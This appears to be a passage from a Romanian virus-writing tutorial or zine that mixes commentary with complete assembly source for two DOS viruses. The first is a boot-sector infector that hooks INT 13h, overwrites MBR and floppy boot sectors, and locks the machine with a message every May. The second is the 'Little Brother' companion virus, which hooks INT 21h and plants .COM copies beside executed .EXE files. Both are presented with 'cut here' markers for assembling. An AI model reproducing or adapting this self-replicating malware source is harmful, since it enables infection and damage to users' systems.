            dw 2880            ; Numarul total de sectoare ale discului : (2880*512-1457664)/512=33 sectoare rezervate
            db 0F0h            ; Tipul discului identic cu primul byte din FAT (MediaByte)
            dw 9               ; Numarul de sectoare/copie FAT
            dw 18              ; Numarul de sectoare/pista
            dw 2               ; Numarul de fete (capete de citire/scriere)
            dd 0               ; Numarul de sectoare din fata sectorului de BOOT : pt. discheta este 0
            dd 0               ; Nefolosit ( Big total number of sectors )
            dw 0               ; Numarul discului fizic
            db 29h             ; Extended boot sector signature
            db 02h,1Fh,61h,1Dh ; Numarul serial al dischetei
            db 'PCT9U_03-05'   ; 11 bytes - Eticheta dischetei ( Volume label )
            db 'FAT12   '      ; 8 bytes  - Identificator pentru tipul de fisiere

            db 0FAh
Contor:     db 00h
Old13h:     db 54h,  0A2h, 00h, 0F0h
Old12h:     db 41h,  0F8h, 00h, 0F0h

Start:      push    cs
            pop     ds
            mov     ah,4
            int     1Ah                     ; obtine in DH luna curenta

            cmp     dh,5
            jne     Nu_e_MAI
            jmp     LunaMai                 ; daca este luna MAI sare la LunaMai
Nu_e_MAI:
            mov     bx,13h*04h              ; memoreaza la Old13h vectorul INT 13h
            mov     ax,[bx]
            mov     cs:Old13hVec,ax
            mov     bx,13h*04h+2
            mov     ax,[bx]
            mov     word ptr cs:Old13hVec+2,ax

            mov     bx,12h*04h              ; memoreaza la Old12h vectorul INT 12h
            mov     ax,[bx]
            mov     cs:Old12hVec ,ax
            mov     bx,12h*04h+2
            mov     ax,[bx]
            mov     word ptr cs:Old12hVec+2,ax

            mov     bh,04h
            mov     bl,13h                  ; BX = 0413h (Memory size in KBytes)
            mov     ax,[bx]
            dec     ax
            mov     [bx],ax                 ; Scade 1K din memoria raportata de BIOS la adr 413h
            mov     cl,6                    ; Calculeaza in AX segmentul corespunzator
            shl     ax,cl                   ; ultimului K de memorie in care se va copia
            sub     ax,7C0h                 ; virusul
            push    ax

            mov     bx,13h*04h+2
            mov     [bx],ax
            mov     bx,12h*04h+2
            mov     [bx],ax
            mov     bx,13h*04h
            mov     ax,NewInt13hHan         ; Seteaza vectorul INT 13h spre NewInt13h
            mov     [bx],ax
            mov     bx,12h*04h
            mov     ax,NewInt12hHan         ; Seteaza vectorul INT 12h spre NewInt12h
            mov     [bx],ax

            pop     ax                      ; AX = segmentul corespunzator ultimului KByte
            mov     si,FixPoint
            mov     di,si
            mov     es,ax
            mov     cx,512/2
            cld                             ; Copiaza virusul de la adresa 0:7C00h
            rep     movsw                   ; in ultimul KByte de memori

            int     19h                     ; Incarca sistemul

NewInt13h:  cmp     ah,2                    ; AH=2 Functia de citire sectoare
            jne     NoBOOTRead              ; Verifica daca se citeste MasterBOOT-ul sau BOOT-ul la diskete
            cmp     cx,1                    ; sau sectorul de BOOT la dischete
            jne     NoBOOTRead              ; Petru citire trebuie:
            cmp     dh,0                    ;  AX = 0201h ; CX = 1 ; DH = 00h
            jne     NoBOOTRead              ;  DL = 80h => HardDisk ; DL = 0 => FloppyDisk
            mov     byte ptr cs:ContorNoRead ,0 ; Daca se citeste sectorul respectiv atunci Contor=0
            pushf
            call    dword ptr cs:Old13hVec  ; Se apeleaza vechea rutina pt INT 13h
            jc      loc_ret_7               ; JMP loc_ret_7 daca eroare la citire
            cmp     word ptr es:[bx][offset VirusFlag-progbegin],0303h ; Verifica daca sectorul citit este deja infectat
            je      loc_6                   ; Daca DA atunci citeste sectorul original pe care l-a salvat in alta parte (vezi Calcul)
            call    sub_1                   ; Daca NU atunci copiaza sectorul original in alta parte (vezi Calcul)
            jnc     loc_3
            clc
            retf    2                       ; Daca eroare la scriere atunci se revine din intrerupere
loc_3:
            push    ds
            push    es
            pop     ds                      ; DS=ES
            push    cs
            pop     es                      ; ES=CS
            mov     si,bx
            add     si,1BEh
            mov     di,MBRecord
            mov     cx,66/2                 ; Copiaza 66 de bytes de la offsetul 1BEh relativ la sectorul citit
            cld                             ; in zona cu Mesaj1. (cei 66 de bytes reprezinta Master Boot Record daca este HardDisk)
            rep     movsw
            mov     si,bx
            add     si,3
            mov     di,BOOTHdr
            mov     cx,60/2                 ; Copiaza 60 de bytes de la offsetul 3 relativ la sectorul citit
            cld                             ; in zona cu Hdr. (cei 60 de bytes reprezinta datele din BOOT daca este disketa)
            rep     movsw
            pop     ds
            mov     ax,0301h                ; Se scrie pe disc in sectorul 1
            mov     cx,1                    ; zona de memorie ce contine virusul
            mov     bx,FixPoint
            xor     dh,dh                   ; DH=0 -> Partition Table sau BOOT Dischete
            pushf
            call    dword ptr cs:Old13hVec 
            retf    2

NoBOOTRead:
            cmp     byte ptr cs:ContorNoRead ,90
            je      loc_5
            inc     byte ptr cs:ContorNoRead 
loc_5:
            jmp     dword ptr cs:Old13hVec 


sub_1       proc    near                   ; Copiaza sectorul original care nu este infectat
            call    Calcul                 ; la noua pozitie returnata de Calcul
            mov     ax,301h
            pushf
            call    dword ptr cs:Old13hVec 
            retn
sub_1       endp

loc_6:      call    Calcul                 ; Daca sectorul citit (MB sau BOOT) este deja infectat atunci
            mov     ax,0201h               ; se citeste sectorul 14 in loc de MB pt HardDisk-uri sau
            pushf                          ; se citeste sectorul 14 sau 3 in loc de BOOT pt dischete
            call    dword ptr cs:Old13hVec 
loc_ret_7:  retf    2


Calcul      proc    near                    ; Subrutina CALCUL returneaza:
            mov     cl,14                   ; CL=14        daca MB HardDisk (DL>=80h)
            cmp     dl,80h                  ; CL=14 & DH=1 daca Discketa cu MediaByte=0F0h
            jae     CalculRet               ; CL=3  & DH=1 daca Discketa cu MediaByte<>0F0h
            mov     dh,1
            mov     al,es:[bx+15h]          ; ES:[BX+15h]=MediaByte
            cmp     al,0F0h
            je      CalculRet
            mov     cl,3
CalculRet:  retn
Calcul      endp


NewInt12h:  cmp     byte ptr cs:ContorNoRead ,90
            jne     cont1
            mov     ax,640
            iret
Cont1:      jmp     dword ptr cs:Old12hVec 


MesajMai:   ;       Aici este urmatorul (MESAJ) XOR 240
            ;       db  'Only bugs exist! ',10h
            ;       db  'RP 1995 Bucharest',0D4h
            db      0BFh, 9Eh,  9Ch,  89h,  0D0h, 92h,  85h,  97h,  83h
            db      0D0h, 95h,  88h,  99h,  83h,  84h,  0D1h, 0D0h, 0EAh
            db      0A2h, 0A0h, 0D0h, 0C1h, 0C9h, 0C9h, 0C5h, 0D0h, 0B2h
            db      85h,  93h,  98h,  91h,  82h,  95h,  83h,  84h,  '$'

LunaMai:    xor     ax,ax                   ; Seteaza modul video 0
            int     10h

            mov     si,MesajLunaMai
            mov     bx,000Ah                ; BH=0 -> pagina 0 ; BL=10 -> culoarea
            mov     cx,1                    ; De cate ori afiseaza caracterul
            mov     dx,0A01h
Cont2:
            mov     ah,2
            inc     dl                      ; Coordonatele cursorului: DH=10;DL=2
            int     10h                     ; Pozitioneaza cursorul la (L=10,C=2)

            mov     ah,9                    ; Functia de scriere caracter si atribut la cursor
            lodsb                           ; Preia cate un caracter din MesajMai
            cmp     al,'$'
            je      Cont3
            xor     al,240                  ; Decodifica : CARACTER XOR 240
            int     10h                     ; Afiseaza caracter
            jmp     short Cont2

Cont3:      mov     cx,0FFFFh
Delay:      loop    Delay                   ; Produce un Delay
            jmp     short LunaMai           ; Intra in bucla infinita: <Setare mod 0; Afisare Txt; Delay>

VirusFlag:  db      03h, 03h                ; Semnatura virusului in sector
Mesaj1:     db      0Ah,'Replace and press any key when ready', 0Dh, 0Ah, 0
            db      'IO      SYS'
            db      'MSDOS   SYS'

progend     equ     $
            db      00h,000h
            db      55h,0AAh                ; Semnatura pentru sector MB sau BOOT

            RPVirus endp

            end     entry

 ----------<taie de aici in sus>---------------------------------------------


     ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
     ³Virusul "Little Brother"³
     ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

     Urmatorul  virus  vi-l  voi  prezenta  pentru  ca  modul  in care acesta
functioneaza  mi  se pare destul de curios pentru un virus de tipul lui. Desi
este  executabil  acesta  actioneaza asemanator cu un virus de tip .BAT (vezi
exemplu de mai sus). Virusul se transmite in forma lui pura.
     El se bazeaza pe faptul ca sistemul DOS executa programele de tip .COM
inaintea celor de tip .EXE.
     Iata cum este clasificat in PattiList acest virus:

     Numele virusului :  Little Brother
     Alte nume        :
     Raspandirea      :  Rara
     Descoperit       :  Octombrie 1991
     Origine          :  Olanda
     Lungime efectiva :  299 Bytes
     Tipul codului    :  SRCE - Spawning Resident .EXE Infector
     Antivirusi       :  ViruScan, AVTK 5.54+, F-Prot 2.03+, Novi 1.1d+


     Prima  data  cand  un program infectat cu "Little Brother" este executat
virusul  devine  rezident  intr-o  'gaura' din memoria joasa a sistemului, in
zona  datelor  de  sistem,  preluand  controlul  asupra  INT  21h.  Nu vor fi
schimbari in memoria totala disponibila.
     Odata rezident, "Little Brother" va infecta programele .EXE cand acestea
sunt  executate.  Programul  .EXE in sine NU ESTE ALTERAT, dar un fisier .COM
de  299  bytes  cu  acelasi  nume  va  fi creat de catre virus. Acest .COM va
contine  virusul  pur si va avea data si timpul la care a fost creat memorate
in director. Urmatorul siruri de caractere pot fi gasite in acest fisier COM:

               "Little Brother"
               "EXE COM"

     Cand  un  utilizator  incearca  sa-si  execute programul obisnuit, se va
lansa de fapt COM-ul si apoi acesta va incarca fisierul EXE.
     De  exemplu  daca  ARJ.EXE  a  fost  virusat atunci in directorul curent
trebuie  sa  existe  ARJ.COM.  Daca un utilizator va da de exemplu urmatoarea
comanda :

                ARJ A TEST *.DOC

atunci  in loc sa se lanseze ARJ.EXE sistemul va lansa ARJ.COM. In acest
moment  virusul  devine rezident. Sa presupunem ca PKZIP.EXE nu este virusat,
dar este lansat acum de catre utilizator. Virusul (care este deja rezident in
urma  comenzii  ARJ)  va  crea  un  fisier  in directorul cu PKZIP.EXE, numit
PKZIP.COM,   fisierul  PKZIP.EXE  ramanad  intact.  Copiinduse  "la  gramada"
fisierele  din  director pe un calculator curat, si dand comanda PKZIP, se va
lansa PKZIP.COM si apoi PKZIP.EXE ,etc.
     Prin  simpla  stergere  a  fisierelor .COM create de virus se realizeaza
devirusarea unui program.


 ----------<taie de aici in jos>---------------------------------------------


cseg            segment
                assume  cs:cseg,ds:cseg,es:nothing

                org     100h

FILELEN         equ     quit - begin
RESPAR          equ     (FILELEN/16) + 17
VER_ION         equ     1
oi21            equ     quit
nameptr         equ     quit+4
DTA             equ     quit+8

                .RADIX  16



begin:          cld

                mov     ax,0DEDEh               ;deja instalat?
                int     21h
                cmp     ah,041h
                je      cancel

                mov     ax,0044h                ;puta programul in 'gaura'

                mov     es,ax
                mov     di,0100h
                mov     si,di
                mov     cx,FILELEN
                rep     movsb

                mov     ds,cx                   ;obtine vectorul original pt INT 21h

                mov     si,0084h
                mov     di,offset oi21
                movsw
                movsw

                push    es                      ;seteaza vectorul catre noul handler

                pop     ds
                mov     dx,offset ni21
                mov     ax,2521h
                int     21h

cancel:         ret


EXE_txt         db      'EXE',0
COM_txt         db      'COM',0

; ===============
; Handler INT 24h
; ===============
ni24:           mov     al,03
                iret

; ===============
; Handler INT 21h
; ===============
ni21:           pushf

                cmp     ax,0DEDEh               ;verificare install ?
                je      do_DEDE

                push    dx
                push    bx
                push    ax
                push    ds
                push    es

                cmp     ax,4B00h                ;executa ?
                jne     exit

doit:           call    infect

exit:           pop     es
                pop     ds
                pop     ax
                pop     bx
                pop     dx
                popf

                jmp     dword ptr cs:[oi21]     ;call catre vechiul handler

do_DEDE:        mov     ax,04100h+VER_ION       ;returneaza o semnatura
                popf
                iret


;==========================================================
; Incearca sa infecteze fisierul cu numele pointat de DS:DX
;==========================================================

infect:         cld

                mov     word ptr cs:[nameptr],dx  ;salveaza pointerul spre nume
                mov     word ptr cs:[nameptr+2],ds
                push    cs                      ;setare DTA
                pop     ds
                mov     dx,offset DTA
                mov     ah,1Ah
                int     21

                call    searchpoint
                mov     si,offset EXE_txt       ;este extensia 'EXE'?
                mov     cx,3
                rep     cmpsb
                jnz     do_com

do_exe:         mov     si,offset COM_txt       ;schimba extensia in COM
                call    change_ext

                mov     ax,3300h                ;obtine flagul ctrl-break
                int     21
                push    dx

                xor     dl,dl                   ;sterge flag-ul
                mov     ax,3301h
                int     21

                mov     ax,3524h                ;obtine vectorul INT 24h
                int     21
                push    bx
                push    es

                push    cs                      ;seteaza vectorul INT 24h
                pop     ds
                mov     dx,offset ni24
                mov     ax,2524h
                int     21
                lds     dx,dword ptr [nameptr]  ;creaza fisierul
                xor     cx,cx
                mov     ah,5Bh
                int     21
                jc      return1
                xchg    bx,ax                   ;salveaza handle

                push    cs
                pop     ds
                mov     cx,FILELEN              ;scrie fisierul
                mov     dx,offset begin
                mov     ah,40h
                int     21
                cmp     ax,cx
                pushf

                mov     ah,3Eh                  ;inchide fisierul
                int     21

                popf
                jz      return1                 ;toti bytes-ii scrisi?

                lds     dx,dword ptr [nameptr]  ;sterge fisierul
                mov     ah,41h
                int     21

return1:        pop     ds                      ;refa vectorul int24
                pop     dx
                mov     ax,2524h
                int     21

                pop     dx                      ;refa flagul ctrl-break
                mov     ax,3301h
                int     21

                mov     si,offset EXE_txt       ;schimba extensia in EXE
                call    change_ext

return:         ret

do_com:         call    findfirst               ;este fisierul un virus?
                cmp     word ptr cs:[DTA+1Ah],FILELEN
                jne     return
                mov     si,offset EXE_txt       ;dute la varianta EXE

                call    change_ext
                call    findfirst
                jnc     return
                mov     si,offset COM_txt       ;schimba extensia in COM
                jmp     short change_ext


; ================
; Gaseste fisierul
; ================

findfirst:      lds     dx,dword ptr [nameptr]
                mov     cl,27h
                mov     ah,4Eh
                int     21
                ret


; ===========================================
; schimba extensia fisierului (CS:SI -> ext)
; ===========================================

change_ext:     call    searchpoint
                push    cs
                pop     ds
                movsw
                movsw
                ret

; =========================
; cauta inceputul extensiei
; =========================

searchpoint:    les     di,dword ptr cs:[nameptr]
                mov     ch,0FFh
                mov     al,'.'
                repnz   scasb
                ret

; =================
; Text si semnatura
; =================

                db      'Little Brother',0

quit:

cseg            ends
                end     begin

 ----------<taie de aici in sus>---------------------------------------------





